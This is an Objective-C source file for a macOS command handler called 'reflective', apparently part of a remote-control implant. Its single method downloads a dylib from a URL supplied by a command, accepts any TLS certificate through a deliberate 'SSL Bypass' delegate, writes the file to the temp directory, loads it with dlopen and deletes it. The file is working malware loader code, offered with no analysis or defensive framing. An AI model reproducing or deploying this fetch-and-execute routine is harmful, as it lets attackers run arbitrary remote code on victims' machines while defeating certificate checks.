#import "ZReflectiveCommandHandler.h"
#import "custom_dlfcn.h"
#import "ZAPIClient.h"
#import <mach-o/loader.h>
#import <mach-o/dyld.h>
#import <dlfcn.h>
#import <mach-o/dyld_images.h>

@interface ZReflectiveCommandHandler () <NSURLSessionDelegate>
@end

@implementation ZReflectiveCommandHandler

- (NSString *)command {
    return @"reflective";
}

- (void)executeCommand:(ZCommandModel *)command 
            completion:(void (^)(BOOL success, NSDictionary *result, NSError *error))completion {
    // Get the URL from params
    NSString *urlString = command.payload[@"url"];
    if (!urlString) {
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:100 
                                       userInfo:@{NSLocalizedDescriptionKey: @"No URL provided"}];
        completion(NO, nil, error);
        return;
    }
    
    // Create URL and request
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"GET"];
    
    // Create semaphore for synchronous operation
    dispatch_semaphore_t semaphore = dispatch_semaphore_create(0);
    
    __block NSData *payloadData = nil;
    __block NSError *downloadError = nil;
    
    // Use NSURLSession with SSL handling
    NSURLSessionConfiguration *config = [NSURLSessionConfiguration defaultSessionConfiguration];
    NSURLSession *session = [NSURLSession sessionWithConfiguration:config
                                                        delegate:self
                                                   delegateQueue:nil];
    
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request
                                          completionHandler:^(NSData *data, NSURLResponse * __unused response, NSError *error) {
        payloadData = [data retain];
        downloadError = [error retain];
        dispatch_semaphore_signal(semaphore);
    }];
    [task resume];
    
    // Wait for completion
    dispatch_semaphore_wait(semaphore, DISPATCH_TIME_FOREVER);
    dispatch_release(semaphore);
    
    if (!payloadData || downloadError) {
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:101 
                                       userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Failed to download payload: %@", downloadError.localizedDescription]}];
        [payloadData release];
        [downloadError release];
        completion(NO, nil, error);
        return;
    }
    
    NSLog(@"Downloaded payload from %@ (size: %lu bytes)", urlString, (unsigned long)payloadData.length);
    
    // Create a temporary file to write the payload
    NSString *tempDir = NSTemporaryDirectory();
    NSString *tempFile = [tempDir stringByAppendingPathComponent:[NSString stringWithFormat:@"payload_%d.dylib", arc4random()]];
    
    // Write payload to temp file
    NSError *writeError = nil;
    if (![payloadData writeToFile:tempFile options:NSDataWritingAtomic error:&writeError]) {
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:102 
                                       userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithFormat:@"Failed to write payload: %@", writeError.localizedDescription]}];
        [payloadData release];
        completion(NO, nil, error);
        return;
    }
    
    // Load the payload using standard dyld
    void *handle = dlopen([tempFile UTF8String], RTLD_NOW);
    if (!handle) {
        const char *dlError = dlerror();
        NSError *error = [NSError errorWithDomain:@"ZReflectiveCommandHandler" 
                                           code:103 
                                       userInfo:@{NSLocalizedDescriptionKey: [NSString stringWithUTF8String:dlError]}];
        [payloadData release];
        [[NSFileManager defaultManager] removeItemAtPath:tempFile error:nil];
        completion(NO, nil, error);
        return;
    }
    
    // Clean up
    [payloadData release];
    [[NSFileManager defaultManager] removeItemAtPath:tempFile error:nil];
    
    // Return success
    completion(YES, @{
        @"status": @"success",
        @"message": @"Payload loaded successfully",
        @"bytes_loaded": @(payloadData.length)
    }, nil);
}

- (BOOL)canCancelCommand {
    return NO;
}

- (BOOL)cancelCommand:(ZCommandModel *)command {
    return NO;
}

#pragma mark - NSURLSessionDelegate

- (void)URLSession:(NSURLSession *)session
didReceiveChallenge:(NSURLAuthenticationChallenge *)challenge
 completionHandler:(void (^)(NSURLSessionAuthChallengeDisposition disposition, NSURLCredential *credential))completionHandler {
    NSLog(@"Received authentication challenge for host: %@", challenge.protectionSpace.host);
    
    if ([challenge.protectionSpace.authenticationMethod isEqualToString:NSURLAuthenticationMethodServerTrust]) {
        NSLog(@"SSL Bypass: Accepting certificate for %@", challenge.protectionSpace.host);
        NSURLCredential *credential = [NSURLCredential credentialForTrust:challenge.protectionSpace.serverTrust];
        completionHandler(NSURLSessionAuthChallengeUseCredential, credential);
    } else {
        completionHandler(NSURLSessionAuthChallengePerformDefaultHandling, nil);
    }
}

@end 